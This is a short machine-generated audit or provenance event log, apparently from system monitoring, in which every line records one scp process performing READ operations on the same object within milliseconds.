1558013050.392:347801218,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801219,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801220,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801221,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801222,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801223,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801224,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801225,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801226,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801227,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801228,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801229,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801230,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801231,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801232,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801233,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801234,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801235,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801236,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801237,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801238,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801239,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801240,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801241,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801242,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801243,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801244,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801245,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801246,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801247,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801248,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801249,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801250,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801251,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801252,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801253,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.402:347801254,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
